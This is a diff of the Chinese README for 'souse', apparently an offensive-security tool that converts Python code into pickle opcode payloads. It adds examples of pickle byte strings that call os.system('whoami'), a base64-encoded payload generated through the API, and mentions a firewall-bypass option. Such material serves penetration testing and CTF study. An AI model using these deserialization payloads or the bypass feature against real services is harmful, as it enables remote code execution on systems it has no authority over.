@@ -3,9 +3,13 @@
 
 [English Version](./README.md)
 
+快速开始: `pip3 install --upgrade souse`
+
 ## 1. 帮助信息
 
 <img src="https://raw.githubusercontent.com/Macr0phag3/souse/master/pics/help.png" width="600">
+
+如果是 pip 安装的，可以直接使用 `souse -h`
 
 ## 2. 核心特性
 
@@ -26,23 +30,30 @@ opcode 利用情况见 [opcode](./opcodes.md)
 
 #### 3.1.1 示例 1
 
-源代码：
+```text
+» cat souse/cases/call-1.py
+from os import system
 
-<img src="https://raw.githubusercontent.com/Macr0phag3/souse/master/pics/eg-1.png" width="300">
+a = "whoami"
+system(a)
+# b'cos\nsystem\np0\nVwhoami\np1\ng0\n(g1\ntR.'
+```
 
-opcode:
-
-<img src="https://raw.githubusercontent.com/Macr0phag3/souse/master/pics/eg-1-s.png" width="600">
+<img src="https://raw.githubusercontent.com/Macr0phag3/souse/master/pics/case-1.png" width="600">
 
 #### 3.1.2 示例 2
 
-源代码:
+自动将原本无法直接序列化的 Python 源码，重构为兼容的 Pickle 指令流
 
-<img src="https://raw.githubusercontent.com/Macr0phag3/souse/master/pics/eg-2.png" width="300">
+```text
+» cat souse/cases/call-3.py
+import os
 
-opcode:
+os.system("whoami")
+# b'cos\nsystem\np0\ng0\n(Vwhoami\ntR.'
+```
 
-<img src="https://raw.githubusercontent.com/Macr0phag3/souse/master/pics/eg-2-s.png" width="600">
+<img src="https://raw.githubusercontent.com/Macr0phag3/souse/master/pics/case-2.png" width="600">
 
 #### 3.1.3 示例 3
 
@@ -59,40 +70,39 @@ c
 
 转换后的 opcode:
 
-<img src="https://raw.githubusercontent.com/Macr0phag3/souse/master/pics/eg-3.png" width="600">
+```py
+In [1]: import base64, souse
+
+In [2]: exp = "from os import system\nsystem('whoami')"
+
+In [3]: souse.API(exp, optimized=True, transfer=base64.b64encode).generate()
+Out[3]: b'Y29zCnN5c3RlbQooVndob2FtaQp0Ui4='
+```
 
 支持的转换函数（调用 API 的时候可以自定义）:
 - [x] base64_encode
 - [x] hex_encode
 - [x] url_encode
 
-#### 3.1.5 测试代码
+#### 3.1.5 运行测试
 
-<img src="https://raw.githubusercontent.com/Macr0phag3/souse/master/pics/test.png" width="400">
-
-#### 3.1.6 运行测试
+需要安装 `pytest`、`pytest_cov `
 
 ```bash
 python souse/souse.py --run-test
 ```
 
-- 需要安装 `pytest`
+#### 3.1.6 查看 opcode explain
 
-开发时也可以直接运行完整测试集：
-
-```bash
-pytest -q
-```
-
-#### 3.1.7 查看 opcode explain
-
-使用 `--explain` 可以在生成完成后输出 opcode 摘要和解释视图：
+使用 `--explain` 可以在生成完成后输出详细的 opcode 翻译：
 
 ```bash
-python souse/souse.py -f souse/cases/combo-6.py --explain
+python souse/souse.py -f souse/cases/call-1.py --explain
 ```
 
-#### 3.1.8 防火墙规则格式
+<img src="https://raw.githubusercontent.com/Macr0phag3/souse/master/pics/explain.png" width="600">
+
+#### 3.1.7 防火墙规则格式
 
 `--bypass` 使用逗号分隔的 opcode 列表:
 
